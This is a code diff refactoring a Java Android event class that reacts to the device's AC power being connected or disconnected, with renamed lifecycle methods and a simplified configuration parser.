@@ -13,12 +13,13 @@ import java.io.IOException;
 
 import com.android.service.Ac;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerAc;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
-public class EventAc extends EventBase implements Observer<Ac> {
+public class EventAc extends BaseEvent implements Observer<Ac> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventAc"; //$NON-NLS-1$
 
@@ -26,58 +27,45 @@ public class EventAc extends EventBase implements Observer<Ac> {
 	private boolean inRange = false;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerAc.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerAc.self().detach(this);
+		onExit(); // di sicurezza
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
-		super.setEvent(event);
+	public void actualGo() {
+		// TODO Auto-generated method stub
+		
+	}
 
-		final byte[] conf = event.getParams();
-
-		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-
-		try {
-			actionOnEnter = event.getAction();
-			actionOnExit = databuffer.readInt();
-		} catch (final IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
-			}
-			return false;
-		}
+	@Override
+	protected boolean parse(ConfEvent conf) {
 
 		return true;
-	}
-
-	@Override
-	public void go() {
-		// TODO Auto-generated method stub
 	}
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Ac a) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Got power status notification: " + a.getStatus()) ;//$NON-NLS-1$
+			Check.log(TAG + " Got power status notification: " + a.getStatus());//$NON-NLS-1$
 		}
 
 		// Nel range
 		if (a.getStatus() == true && inRange == false) {
 			inRange = true;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " AC IN") ;//$NON-NLS-1$
+				Check.log(TAG + " AC IN");//$NON-NLS-1$
 			}
 			onEnter();
 		} else if (a.getStatus() == false && inRange == true) {
 			inRange = false;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " AC OUT") ;//$NON-NLS-1$
+				Check.log(TAG + " AC OUT");//$NON-NLS-1$
 			}
 			onExit();
 		}
@@ -85,11 +73,5 @@ public class EventAc extends EventBase implements Observer<Ac> {
 		return 0;
 	}
 
-	public void onEnter() {
-		trigger(actionOnEnter);
-	}
 
-	public void onExit() {
-		trigger(actionOnExit);
-	}
 }
